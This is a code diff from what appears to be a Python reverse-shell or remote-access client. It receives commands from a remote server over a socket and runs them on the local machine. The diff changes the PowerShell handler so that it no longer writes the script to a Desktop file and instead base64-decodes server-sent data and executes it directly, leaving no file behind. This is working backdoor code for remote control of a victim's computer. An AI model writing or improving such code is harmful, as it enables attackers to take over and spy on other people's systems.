@@ -107,7 +107,6 @@ def socket_connect():
 # Receive command from remote server and run on local machine
 def receive_commands():
     while True:
-        # data = s.recv(20480).decode()
         received_command = reliable_receive(s)
         print(received_command)
 
@@ -152,17 +151,19 @@ def receive_commands():
 
 def run_powerShell_script(data):
     try:
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        file_path = os.path.join(desktop_path, "test.ps1")
-        
-
-        write_file(path=file_path, content=data)
-        result = execute_command([file_path], "-file")
-        # os.remove(file_path)
+        powershell_script = base64.b64decode(data).decode()
+        result = execute_command([powershell_script], "")
         return result
+        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        # file_path = os.path.join(desktop_path, "test.ps1")
+
+        # write_file(path=file_path, content=data)
+        # result = execute_command([file_path], "-file")
+        # os.remove(file_path)
+        # return result
     except Exception as ex:
         return ("[Error] from run powershell script \n" + str(ex))
-
+ 
 
 def get_system_info():
     sysInfo = platform.uname()
